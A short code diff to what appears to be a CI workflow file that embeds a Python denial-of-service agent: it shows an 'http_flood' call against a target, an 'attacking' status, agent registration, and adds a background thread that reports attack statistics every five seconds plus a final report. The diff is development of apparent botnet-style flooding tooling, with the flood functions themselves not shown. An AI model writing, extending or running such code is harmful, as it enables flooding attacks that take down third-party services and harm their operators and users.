@@ -134,6 +134,15 @@ jobs:
               stats['status'] = 'attacking'
               print(f"Attack started: {method.upper()} -> {target}")
               
+              # Report stats every 5 seconds during attack
+              def periodic_report():
+                  while stats['status'] == 'attacking':
+                      report_stats()
+                      time.sleep(5)
+              
+              report_thread = threading.Thread(target=periodic_report, daemon=True)
+              report_thread.start()
+              
               if method == 'http':
                   count, errors = http_flood(target, duration, rate)
                   stats['requests_sent'] += count
@@ -152,6 +161,7 @@ jobs:
               
               stats['status'] = 'idle'
               print(f"Attack completed: {stats['requests_sent']} requests sent")
+              report_stats()  # Final report
           
           def register_agent():
               global agent_id
